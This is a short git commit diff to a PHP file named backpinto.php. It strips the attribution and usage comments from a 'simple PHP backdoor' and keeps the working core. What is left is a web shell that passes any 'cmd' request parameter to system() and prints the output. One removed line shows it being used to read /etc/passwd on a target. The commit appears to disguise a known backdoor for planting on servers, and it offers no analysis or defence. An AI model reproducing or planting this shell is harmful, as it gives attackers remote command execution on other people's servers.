49758f35512b49fafdb6c6cd1a587022a9f8f35a
dohnjoeph <31086693+dohnjoeph@users.noreply.github.com>
2019-09-07 12:00:50 -0400

    Update backpinto.php

--- backpinto.php
+++ backpinto.php
@@ -1,17 +1,8 @@
-<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
-
-<?php
-
+<?php 
 if(isset($_REQUEST['cmd'])){
         echo "<pre>";
         $cmd = ($_REQUEST['cmd']);
         system($cmd);
         echo "</pre>";
         die;
-}
-
-?>
-
-Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
-
-<!--    http://michaeldaw.org   2006    -->
+}?>
